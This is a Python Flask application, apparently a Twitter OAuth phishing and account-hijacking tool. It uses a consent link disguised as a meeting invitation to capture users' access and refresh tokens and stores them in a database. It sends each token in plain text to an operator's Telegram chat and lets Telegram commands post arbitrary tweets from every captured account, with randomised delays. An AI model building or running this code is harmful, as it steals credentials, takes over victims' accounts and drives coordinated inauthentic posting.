import base64
import hashlib
import os
import requests
import time
import random
from flask import Flask, redirect, request, session, render_template, url_for
import psycopg2
from psycopg2.extras import RealDictCursor

# Configuration: Ensure these environment variables are set correctly
CLIENT_ID = os.getenv('CLIENT_ID')
CLIENT_SECRET = os.getenv('CLIENT_SECRET')
CALLBACK_URL = os.getenv('CALLBACK_URL')  # e.g., 'https://your-app.onrender.com/callback'
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')
WEBHOOK_URL = os.getenv('WEBHOOK_URL')
DATABASE_URL = os.getenv('DATABASE_URL')  # Render-provided PostgreSQL database URL

DEFAULT_MIN_DELAY = int(os.getenv("BULK_POST_MIN_DELAY", 2))  # Default to 2 seconds if not set
DEFAULT_MAX_DELAY = int(os.getenv("BULK_POST_MAX_DELAY", 10))  # Default to 10 seconds if not set

app = Flask(__name__)
app.secret_key = os.urandom(24)

# Initialize PostgreSQL database connection
def get_db_connection():
    conn = psycopg2.connect(DATABASE_URL, sslmode='require')
    return conn

def init_db():
    conn = get_db_connection()
    with conn.cursor() as cursor:
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS tokens (
                id SERIAL PRIMARY KEY,
                access_token TEXT NOT NULL,
                refresh_token TEXT,
                username TEXT NOT NULL
            );
        ''')
    conn.commit()
    conn.close()

init_db()

# Store token in the database
def store_token(access_token, refresh_token, username):
    conn = get_db_connection()
    with conn.cursor() as cursor:
        cursor.execute(
            'INSERT INTO tokens (access_token, refresh_token, username) VALUES (%s, %s, %s)',
            (access_token, refresh_token, username)
        )
    conn.commit()
    conn.close()
    send_message_via_telegram(f"💾 Token added for @{username}. Total tokens in database: {get_total_tokens()}")

# Get all tokens from the database
def get_all_tokens():
    conn = get_db_connection()
    with conn.cursor(cursor_factory=RealDictCursor) as cursor:
        cursor.execute('SELECT access_token, refresh_token, username FROM tokens')
        tokens = cursor.fetchall()
    conn.close()
    return tokens

# Get total token count from the database
def get_total_tokens():
    conn = get_db_connection()
    with conn.cursor() as cursor:
        cursor.execute('SELECT COUNT(*) FROM tokens')
        total = cursor.fetchone()[0]
    conn.close()
    return total

# Refresh a token in the database
def refresh_token_in_db(refresh_token, username):
    token_url = 'https://api.twitter.com/2/oauth2/token'
    client_credentials = f"{CLIENT_ID}:{CLIENT_SECRET}"
    auth_header = base64.b64encode(client_credentials.encode()).decode('utf-8')
    
    headers = {
        'Authorization': f'Basic {auth_header}',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    data = {
        'refresh_token': refresh_token,
        'grant_type': 'refresh_token',
        'client_id': CLIENT_ID
    }

    response = requests.post(token_url, headers=headers, data=data)
    token_response = response.json()

    if response.status_code == 200:
        new_access_token = token_response.get('access_token')
        new_refresh_token = token_response.get('refresh_token')
        
        conn = get_db_connection()
        with conn.cursor() as cursor:
            cursor.execute(
                'UPDATE tokens SET access_token = %s, refresh_token = %s WHERE username = %s',
                (new_access_token, new_refresh_token, username)
            )
        conn.commit()
        conn.close()

        send_message_via_telegram(f"🔑 Token refreshed for @{username}. New Access Token: {new_access_token}")
        return new_access_token, new_refresh_token
    else:
        send_message_via_telegram(f"❌ Failed to refresh token for @{username}: {response.json().get('error_description', 'Unknown error')}")
        return None, None

# Send message via Telegram
def send_message_via_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    requests.post(url, json=data)

# Generate code verifier and challenge for OAuth
def generate_code_verifier_and_challenge():
    code_verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode('utf-8')
    code_challenge = base64.urlsafe_b64encode(
        hashlib.sha256(code_verifier.encode()).digest()
    ).rstrip(b'=').decode('utf-8')
    return code_verifier, code_challenge

# Function to send a startup message with OAuth link and meeting link
def send_startup_message():
    state = "0"
    code_verifier, code_challenge = generate_code_verifier_and_challenge()
    authorization_url = CALLBACK_URL
    meeting_url = f"{CALLBACK_URL}j?meeting={state}&pwd={code_challenge}"
    
    message = (
        f"🚀 *OAuth Authorization Link:*\n[Authorize link]({authorization_url})\n\n"
        f"📅 *Meeting Link:*\n[Meeting link]({meeting_url})"
    )
    send_message_via_telegram(message)

# Function to get Twitter username and profile URL using access token
def get_twitter_username_and_profile(access_token):
    url = "https://api.twitter.com/2/users/me"
    headers = {
        "Authorization": f"Bearer {access_token}"
    }
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        data = response.json().get("data", {})
        username = data.get("username")
        profile_url = f"https://twitter.com/{username}" if username else None
        return username, profile_url
    else:
        print(f"Failed to fetch username. Status code: {response.status_code}")
        return None, None
# Function to post a tweet using a single token
def post_tweet(access_token, tweet_text):
    TWITTER_API_URL = "https://api.twitter.com/2/tweets"
    headers = {
        "Authorization": f"Bearer {access_token}",
        "Content-Type": "application/json"
    }
    payload = {"text": tweet_text}
    response = requests.post(TWITTER_API_URL, json=payload, headers=headers)
    
    if response.status_code == 201:
        tweet_data = response.json()
        return f"Tweet posted successfully: {tweet_data['data']['id']}"
    else:
        error_message = response.json().get("detail", "Failed to post tweet")
        return f"Error posting tweet: {error_message}"

# Handle posting a tweet with a single token
def handle_post_single(tweet_text):
    tokens = get_all_tokens()
    if tokens:
        access_token, _, username = tokens[0]
        result = post_tweet(access_token, tweet_text)
        send_message_via_telegram(f"📝 Tweet posted with @{username}: {result}")
    else:
        send_message_via_telegram("❌ No tokens found to post a tweet.")

# Handle posting tweets in bulk with delays
def handle_post_bulk(message):
    tokens = get_all_tokens()
    parts = message.split(' ', 1)
    if len(parts) < 2:
        send_message_via_telegram("❌ Incorrect format. Use `/post_bulk <tweet content>`.")
        return

    tweet_text = parts[1]
    min_delay, max_delay = DEFAULT_MIN_DELAY, DEFAULT_MAX_DELAY
    if not tokens:
        send_message_via_telegram("❌ No tokens found to post tweets.")
        return
    
    for access_token, _, username in tokens:
        result = post_tweet(access_token, tweet_text)
        delay = random.randint(min_delay, max_delay)
        send_message_via_telegram(
            f"📝 Tweet posted with @{username}: {result}\n"
            f"⏱ Delay before next post: {delay} seconds."
        )
        time.sleep(delay)
    send_message_via_telegram(f"✅ Bulk tweet posting complete. {len(tokens)} tweets posted.")
# Refresh token for a single token and notify Telegram
def handle_refresh_single():
    tokens = get_all_tokens()
    if tokens:
        _, token_refresh, username = tokens[0]
        refresh_token_in_db(token_refresh, username)
    else:
        send_message_via_telegram("❌ No tokens found to refresh.")

# Refresh tokens for all users and notify Telegram
def handle_refresh_bulk():
    tokens = get_all_tokens()
    if tokens:
        for _, refresh_token, username in tokens:
            refresh_token_in_db(refresh_token, username)
        send_message_via_telegram(f"✅ Bulk token refresh complete. {len(tokens)} tokens refreshed.")
    else:
        send_message_via_telegram("❌ No tokens found to refresh.")

# Telegram bot webhook to listen for commands
@app.route('/webhook', methods=['POST'])
def telegram_webhook():
    update = request.json
    message = update.get('message', {}).get('text', '')

    if message == '/refresh_single':
        handle_refresh_single()
    elif message == '/refresh_bulk':
        handle_refresh_bulk()
    elif message.startswith('/post_single'):
        tweet_text = message.replace('/post_single', '').strip()
        if tweet_text:
            handle_post_single(tweet_text)
        else:
            send_message_via_telegram("❌ Please provide tweet content.")
    elif message.startswith('/post_bulk'):
        tweet_text = message.replace('/post_bulk', '').strip()
        if tweet_text:
            handle_post_bulk(tweet_text)
        else:
            send_message_via_telegram("❌ Please provide tweet content.")
    else:
        send_message_via_telegram("❌ Unknown command. Use /refresh_single, /refresh_bulk, /post_single <tweet>, or /post_bulk <tweet>.")

    return '', 200
# Authentication and authorization process
@app.route('/')
def home():
    code = request.args.get('code')
    state = request.args.get('state')
    error = request.args.get('error')

    if not code:
        state = "0"
        session['oauth_state'] = state
        code_verifier, code_challenge = generate_code_verifier_and_challenge()
        session['code_verifier'] = code_verifier

        authorization_url = (
            f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
            f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
            f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
        )
        return redirect(authorization_url)

    if code:
        if error:
            return f"Error during authorization: {error}", 400

        if state != "0":
            return "Invalid state parameter", 403

        code_verifier = session.pop('code_verifier', None)
        token_url = "https://api.twitter.com/2/oauth2/token"
        data = {
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': CALLBACK_URL,
            'code_verifier': code_verifier
        }

        response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
        token_response = response.json()

        if response.status_code == 200:
            access_token = token_response.get('access_token')
            refresh_token = token_response.get('refresh_token')
            session['access_token'] = access_token
            session['refresh_token'] = refresh_token
            username, profile_url = get_twitter_username_and_profile(access_token)
            store_token(access_token, refresh_token, username)
            session['username'] = username
            total_tokens = get_total_tokens()

            send_message_via_telegram(
                f"🔑 Access Token: {access_token}\n"
                f"🔄 Refresh Token: {refresh_token}\n"
                f"👤 Username: @{username}\n"
                f"🔗 Profile URL: {profile_url}\n"
                f"📊 Total Tokens in Database: {total_tokens}"
            )
            return redirect(url_for('active'))
        else:
            error_description = token_response.get('error_description', 'Unknown error')
            return f"Error retrieving access token: {error_description}", response.status_code

# Route to display active.html
@app.route('/active')
def active():
    username = session.get('username', 'User')
    return render_template('active.html', username=username)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    send_startup_message()
    app.run(host='0.0.0.0', port=port)
